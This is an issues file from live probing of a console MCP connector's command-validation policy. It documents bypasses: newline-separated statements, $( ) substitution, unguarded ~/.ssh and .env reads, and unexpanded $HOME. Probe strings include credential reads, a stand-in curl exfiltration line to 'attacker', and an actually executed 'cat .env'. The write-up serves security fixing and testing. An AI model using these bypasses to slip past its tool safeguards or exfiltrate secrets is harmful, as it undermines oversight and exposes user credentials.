# console-mcp — issues found by live probing

Findings from the same test session as `todos/fedit-issues.md`, run against the
running `console` connector (`mcp_connectors/console_mcp.py`, started with
`--root-dir /mnt/bigfoot/dev/benchmarkit`). Every item was reproduced through
the actual MCP tools. Line numbers refer to the version probed (388 lines).

The three tools were used as an oracle: `check_command_allowed` is
`validate_command()` without the `subprocess.run`, so a command can be probed
for a policy verdict **without executing it**. That is what makes the
policy-bypass items below safe to demonstrate — nothing dangerous was ever run.

Same rule as the other file: nothing here proposes loosening the path policy.
The findings are (a) frictions that block ordinary work in this repo, and (b)
places where the policy is *weaker than the docstring claims*, which is the
part to fix first.

Legend: **[blocks me]** = hit while doing real work in this project.

---

## DONE: C-1. `|`, `;`, `&&` inside a quoted argument kill an otherwise-safe command **[blocks me]**

The root bypass and the pattern check are mutually exclusive: any command that
references a path *outside* the root must pass `dangerous_patterns`
(l.200-204), which is a plain substring test on the **raw command string** —
quoting is never considered.

    check_command_allowed('cat logs/probe/plain.txt | wc -l')  ->  ALLOWED   (all paths in root)
    check_command_allowed('cat /etc/hostname | wc -l')         ->  NOT ALLOWED: dangerous pattern '|'
    check_command_allowed('grep "<div" logs/probe/plain.txt')  ->  ALLOWED
    check_command_allowed('grep foo /etc/hostname 2>&1')       ->  NOT ALLOWED: dangerous pattern '&'
    check_command_allowed('curl -s "https://example.com/?a=1&b=2"') -> ALLOWED (in-root bypass)

The same pipe is allowed or refused depending on an unrelated path argument, and
a `|` that is part of a *search pattern* or a URL is refused. `2>&1` — the most
normal redirect there is — is refused outside the root.

Why it matters: this is the friction the user reported ("the pipe"). It is not
that pipes are blocked; it is that the check reads the string, not the parsed
shell. Note it also means the *policy* is what refuses the pipe, so the root
bypass in C-2 is the same line of code seen from the other side.

Suggested fix: run the pattern check on the **parsed** structure instead of the
raw string, or drop it entirely and rely on `shlex` + the allow list. `shlex`
already fails on unbalanced quotes (l.174-177), and the dangerous characters
only matter as *operators*, which is visible after parsing. Concretely: parse
with `shlex.shlex(command, punctuation_chars=True)` and reject only when a
token in `(';', '||', '&&', '|', '&')` or a redirect appears **outside**
quoting — then `grep "<div" file`, `curl "…?a=1&b=2"` and `2>&1` (or accept
`2>&1` explicitly as a supported stderr merge) behave sanely.

Keep it honest: if operator *usage* stays blocked outside the root, say so in
the error message and name the alternative ("run it in two calls", "or keep
the paths inside the root") — right now the message is a dead end.

---

## DONE: C-2. The allow list is effectively dead inside the root (and alive where it shouldn't be) **[blocks me]**

`validate_command()` only consults the lists when the in-root bypass does **not**
fire (l.187-198), and two details decide which side you land on:

1. `path_argument_tokens()` (l.146-156) treats **any non-flag token** as a path.
   A relative token therefore resolves inside the root (`resolve_as_path`), so
   even shell *operators* count as in-root paths:

       check_command_allowed('git status && git log --oneline | head -5')  ->  ALLOWED
       # parsed: ['git','status','&&','git','log','--oneline','|','head','-5']
       # '&&' and '|' become in-root "paths" -> bypass fires -> pipes are legal

2. The bypass requires `path_tokens` to be **non-empty** (l.189), so a command
   with only flags never bypasses and must be on the allow list:

       check_command_allowed('pytest -q')        ->  NOT ALLOWED: not in the allowed commands list
       check_command_allowed('cd')               ->  NOT ALLOWED: not in the allowed commands list
       check_command_allowed('python3 -m pytest -q') -> ALLOWED  (because 'pytest' looks like a path)
       check_command_allowed('rg TODO web/src')  ->  ALLOWED     ('rg' is not in the list at all)
       check_command_allowed('make test')        ->  ALLOWED     ('make' is not in the list at all)
       check_command_allowed('npx vite build')   ->  ALLOWED     ('npx' is not in the list at all)

Net effect inside the root: the "security whitelist" (91 commands) decides
nothing, and `BLOCKED_COMMANDS` is not consulted either — so these are all
legal, which is *by design* per the docstring but is not what the tool names
suggest:

       rm -rf logs/probe            -> ALLOWED
       find logs/probe -delete      -> ALLOWED
       chmod +x logs/probe/script.sh-> ALLOWED
       kill -9 1                    -> ALLOWED   ('1' is a "path token", in-root)

while the ordinary dev commands an agent reaches for first are refused
(`pytest`, `cd`, `make`, `rg` as a bare name). That is the second source of the
"console blocks my commands" symptom: the refusal has nothing to do with
danger, it is a tokenisation accident.

Also misleading: `list_allowed_commands()` prints "Allowed commands (91 total)"
with no hint that the list is ignored inside the root, so an agent wastes turns
hunting for an allow-listed spelling of a command that was refused for a
different reason.

Suggested fix (no loosening, just coherence):

* Check **every** statement's base command against `ALWAYS_BLOCKED_COMMANDS`,
  not just `parts[0]` (see C-3) — that is the part with real consequence.
* Decide explicitly whether the allow list applies in-root. If the current
  "root = operator's workspace, no policy" behaviour is intended, keep it but
  (a) stop calling `ALLOWED_COMMANDS` a whitelist in the comments and the
  server `instructions`, and (b) have `list_allowed_commands()` say so:
  "the list only applies to commands referencing paths outside the root".
* If the allow list *should* apply everywhere, drop the bypass for the list
  check and extend the list instead (`pytest`, `rg`, `make`, `npx`, `cd`,
  `open`, `lsof`, `tail -f` are the ones I actually wanted this session).
* Make `resolve_as_path` ignore tokens that cannot be paths in context — at
  minimum skip tokens that `shlex` reports as punctuation (`&&`, `|`, `;`) and
  bare digits, so `path_tokens` means what its name says.

---

## DONE: C-3. A newline-separated second statement bypasses the whole policy **[security]**

The highest-impact finding. The policy only ever looks at `parts[0]`
(l.181), and `shlex.split` treats a newline as whitespace — but execution is
`subprocess.run(command, shell=True)` (l.247-254), and `/bin/sh` treats a
newline as a **statement separator**. So a second line is executed without ever
being validated:

    check_command_allowed('echo hi\nid')                     ->  ALLOWED
    execute_command('echo statement-one\nwhoami')            ->  "statement-one\nvgr"   (both ran)
    check_command_allowed('ls ~/.ssh\n')                     ->  ALLOWED  (line 1 is in-root-ish, line 2 unchecked)
    check_command_allowed('ls /etc\nrm -rf logs/probe')      ->  ALLOWED  (rm never reaches the block list)
    check_command_allowed('ls logs/probe\ncat ~/.ssh/id_rsa')->  ALLOWED
    check_command_allowed('ls logs/probe\nsudo ls /root')    ->  ALLOWED  (even ALWAYS_BLOCKED is skipped)

Compare the semicolon, which *is* caught only because `;` happens to be in the
`dangerous_patterns` string list:

    check_command_allowed('ls /etc; cat /etc/shadow')        ->  NOT ALLOWED: dangerous pattern ';'

So the block list is enforced by an accident of string matching, and any
separator that is not in that list (`\n`, and `(` … `)` groups, `${ ... }`,
`if`/`then`) is a clean bypass. This is a policy hole, not a friction — it is
also the reason `list_allowed_commands()` and `check_command_allowed()` cannot
be trusted as an oracle today.

Two structural fixes, both small:

1. **Reject the shell.** Run the parsed `parts` directly
   (`subprocess.run(parts, shell=False, cwd=work_dir)`) instead of re-parsing
   the raw string with `shell=True`. Then what was validated is exactly what
   runs: no separators, no substitution, no redirection. This single change
   closes C-3 and C-4 and makes C-1's pattern list unnecessary. The docstring
   examples that show `cat /etc/hostname` keep working; anything relying on
   shell features breaks — which is the point, and it should be said in the
   `instructions` string.
2. If `shell=True` must stay (for pipes), split the command on shell
   separators *before* validating and validate **every** statement's base
   command, and reject unknown separators rather than allowing them:

       statements = re.split(r"[;\n]|&&|\|\|", command)   # after shlex-aware quoting
       for stmt in statements: validate one statement

   Anything that cannot be split safely should be refused.

Add tests to a new `tests/test_console_policy.py` (the repo has none for this
connector): every example above must be refused, and `execute_command` must
never run a statement that `check_command_allowed` did not see.

---

## DONE: C-4. Command substitution runs inside the in-root bypass **[security]**

`$( ... )` and backticks are only caught by the `dangerous_patterns` substring
check, i.e. only when the bypass does not fire. With an in-root path present,
the substitution is executed verbatim (confirmed live, benign payload):

    execute_command('echo substituted:$(whoami)')            ->  "substituted:vgr"
    check_command_allowed('echo $(pwd)')                     ->  ALLOWED
    check_command_allowed('curl -s "https://host/?a=1&b=2"') ->  ALLOWED (a URL counts as a path token)

The last two combine into a plain exfiltration channel that the policy does not
see: `curl -s http://attacker/?d=$(cat ~/.ssh/id_rsa)` is only refused by
luck — because the *pattern* check caught the `|` in my test payload
(`... | base64`), not because the substitution was understood. Fix is the same
as C-3 fix 1 (`shell=False`); a partial mitigation if that is not adopted is to
move the `$(` / backtick / redirect checks **before** the bypass, so they apply
everywhere like `ALWAYS_BLOCKED_COMMANDS` does.

---

## DONE: C-5. One out-of-root token disables the bypass for a whole chain, and then only `parts[0]` is checked **[blocks me]**

This is the refusal I hit most often, and the error message never explains it.
A relative `..` resolves *outside* the root, which retro-actively invalidates
the bypass for **every** statement in the chain — and once the bypass is off,
only the *first* word of the whole string is matched against the lists:

    check_command_allowed('ls web && ls ..')
        -> NOT ALLOWED: Command contains dangerous pattern '&'
    check_command_allowed('cd web && pwd')
        -> ALLOWED                                     (all tokens in-root: bypass fires)
    check_command_allowed('cd web && pwd && cd .. && pwd')
        -> NOT ALLOWED: Command 'cd' is not in the allowed commands list

Three separate defects visible in those three lines:

* `resolve_as_path('..')` yields `/mnt/bigfoot/dev` (l.126-135), so `..` is a
  perfectly ordinary token that silently moves the command out of the bypass.
  Same for `/tmp/x`, `~`, `$HOME` — i.e. any command that touches a scratch
  file outside the workspace.
* Once the bypass is off, `base_command = parts[0]` (l.181) is the *only*
  command looked at. In the third example the verdict is about `cd`, while the
  commands that actually do the damage in a `&&`/`;` chain — `pwd`, and
  anything else after the first separator — are never checked at all. The
  allow list and `BLOCKED_COMMANDS` therefore enforce nothing past statement
  one.
* `dangerous_patterns` includes a bare `&` *and* `&&`/`||` (l.201), so
  `&&` is refused twice over, and any quoted `&` (a URL query, a regex) is
  refused with it. `curl -s "https://example.com/?a=1&b=2"` survives only
  because its URL argument is treated as an in-root *path* token, which makes
  the bypass fire before the pattern check is ever reached (see C-6).

Fix: split the command on shell separators (`;`, `&&`, `||`, `|`, newlines)
**before** deciding anything, then run the full policy on each statement —
`base_command`, allow list, and path check per statement, not per string. That
single change fixes C-2, C-3, C-4 and this item's second bullet at once, and
makes the error messages name the offending statement.

---

## DONE: C-6. There is no path deny-list at all: `~/.ssh`, `~/.git-credentials` and `.env` are readable **[security]**

`validate_command()` checks *scopes and patterns*, never the *identity* of a
path, so once a command names no path (or a URL, which counts as a path token)
it reaches any file the user can read. Verified with `check_command_allowed`
(non-executing — **nothing sensitive was ever run**):

    check_command_allowed('cat ~/.ssh/id_rsa')            ->  ALLOWED
    check_command_allowed('cat ~/.git-credentials')       ->  ALLOWED
    check_command_allowed('cat .env')                     ->  ALLOWED
    check_command_allowed('cat /home/vgr/dev/benchmarkit/.env') ->  ALLOWED

The last four lines are the real problem: `fedit` refuses `.env` and
`~/.ssh` through any path, including a non-root alias (`todos/fedit-issues.md`,
F-9), while `console` — the tool with the *same* file access — happily runs
`cat .env | head -4` (I ran that one; it printed the config). So the fedit
secret policy is trivially bypassable through the sibling connector that is
enabled in the same session. Note the in-root case is a *documented* choice for
fedit ("inside the root the policy is bypassed"); what is not documented, and
is not intentional for console, is that the credential stores outside the root
have no guard either.

Two more variants of the same gap, both verified with the checker only:

    check_command_allowed('cat $HOME/.ssh/id_rsa')  ->  ALLOWED
    check_command_allowed('cat ../secrets.txt')     ->  ALLOWED

* `resolve_as_path()` (l.126-135) calls `expanduser` but never `expandvars`, so
  the token `$HOME/.ssh/id_rsa` is anchored at the root and judged **inside** it
  — the bypass fires — while `subprocess.run(shell=True)` expands `$HOME` and
  reads the real `~/.ssh/id_rsa`. The checker and the executor disagree about
  where the path is, so any out-of-root path written with a `$VAR` prefix reads
  as in-root. (`~` is handled, `$HOME` is not.)
* An allow-listed command has no path limit whatsoever once the bypass is off:
  `cat ../anything` passes because the check is "is `cat` allowed", never "is
  this target allowed". So the root is not a sandbox for reads by allow-listed
  commands — it only changes *which* list is consulted.

Both are fixed by the same change below, plus expanding variables in
`resolve_as_path` (or refusing unexpandable `$` tokens outright) so the policy
verdict is computed on the path the shell will actually open.

Fix (does not loosen anything — it copies fedit's existing policy): import or
duplicate `DENY_COMPONENTS_SECRET` / `DENY_FILENAMES` / `DENY_FILE_SUFFIXES` /
`DENY_FILE_PREFIXES` from `fedit_mcp.py` into a shared module, and in
`validate_command()` reject any resolved path token matching them regardless of
whether the bypass fired. Sharing one module also keeps the two connectors from
drifting apart, which is how this hole exists.

---

## DONE: C-7. Non-UTF-8 output destroys the entire tool result **[blocks me]**

`subprocess.run(..., text=True)` (l.247-254) decodes with the default
UTF-8/strict codec, and the decode error is caught by the bare `except
Exception` (l.279) — so *all* output, including the part that decoded fine, is
replaced by one error line:

    execute_command("printf 'a\\x00\\xffb\\n'")
        -> Error executing command: 'utf-8' codec can't decode byte 0xff in position 2

Consequence: any command that touches a binary artifact (a PNG, `web/dist`
bundles, a `.pyc`, `git show` on a binary blob, or `xxd`/`base64` output that
emitted a stray byte) yields nothing usable, and the message names neither the
offending byte's position in the *file* nor a way to get the rest. It also
loses the exit code.

Fix: pass `errors="replace"` (or `encoding="utf-8", errors="backslashreplace"`)
so the run never dies on decoding, and truncate/flag rather than fail: report
`[output truncated: N bytes]`. For genuinely binary reads, mention
`base64 < file` in the tool docstring so the model has a documented route.

---

## DONE: C-8. A timeout discards all partial output **[blocks me]**

    execute_command('echo before-sleep; sleep 20; echo after-sleep', timeout=3)
        -> Error: Command timed out after 3 seconds

`subprocess.TimeoutExpired` carries `stdout`/`stderr`, and `capture_output`
already collected `before-sleep`, but the handler (l.273-274) throws both away.
For the failure mode that actually matters — a build/test command that hangs
*after* printing a wall of progress and errors — the agent gets zero diagnostic
value and re-runs the same expensive command.

Fix: use `Popen` + `communicate(timeout=...)` (or read `exc.output`) and return
the partial stdout/stderr plus the timeout note. `check_command_allowed`'s
`timeout` handling in the docstring should also state the default (30 s) — it
currently appears only in the `execute_command` signature.

---

## DONE: C-9. No cap on tool output — one `cat` can flood the context **[blocks me]**

`execute_command` returns `result.stdout` unbounded (l.259-260). Verified:
`seq 1 4000 | tr '\n' ' '` returned ~28 KB inline in a single tool result, and
`wc -l` on a repo file behaves the same. Combined with the SSE/WorkBench
history, one careless `cat web/dist/assets/*.js` ends the conversation.

Fix: cap the returned output (e.g. first + last N lines with an explicit
`[... N lines omitted ...]` marker), and tell the model to pipe through
`head`/`sed -n` itself. Cap stdout and stderr separately so a stack trace is
not squeezed out by a chatty stdout.

---

## Summary and suggested order

| # | Issue | Impact | Size |
|---|---|---|---|
| C-1 | Operators inside quoted args refused | blocked ordinary greps | S |
| C-2 | Allow list inert in-root, alive where it should not be | confusing refusals | M |
| C-3 | Newline starts an unchecked second statement | **policy bypass** | M |
| C-4 | `$( )` runs inside the bypass | **exfiltration channel** | M |
| C-5 | One out-of-root token kills the chain; only `parts[0]` checked | blocked ordinary chains | M |
| C-6 | No path deny-list: `.ssh`, `.git-credentials`, `.env` | **hole in fedit's policy** | S |
| C-7 | Non-UTF-8 output loses everything | binary reads impossible | S |
| C-8 | Timeout drops partial output | wasted reruns | S |
| C-9 | Uncapped output | context flooding | S |

Do C-3, C-4 and C-6 first: they are the places where the connector is weaker
than its own docstring claims, and C-6 in particular means the careful secret
policy in `fedit_mcp.py` is currently bypassable through this connector. They
share one root cause with C-2 and C-5 — the policy is applied to one flat
string, using `shlex` for tokenising and substring matching for operators,
while `subprocess.run(shell=True)` executes a much richer language.

Suggested shape of the shared fix, in order of leverage:

1. `subprocess.run(parts, shell=False)` after an explicit, policy-checked split
   on shell metacharacters — kills C-3, C-4, C-5-bullet-2 in one move.
2. A per-statement loop: base-command checks + path checks + the fedit deny-list
   (C-6) for every statement.
3. Decide the pattern check once, on parsed tokens, so quoting stops mattering
   (C-1).
4. Robustness pass: `errors="replace"`, output cap, partial output on timeout
   (C-7..C-9).

There is no test file for this connector (`tests/` covers fedit's policy in
`test_fedit_policy.py` but nothing for console), so every fix above needs a new
`tests/test_console_policy.py`. Drive it through `validate_command()` directly:
that is what makes the bypass cases testable without executing anything.


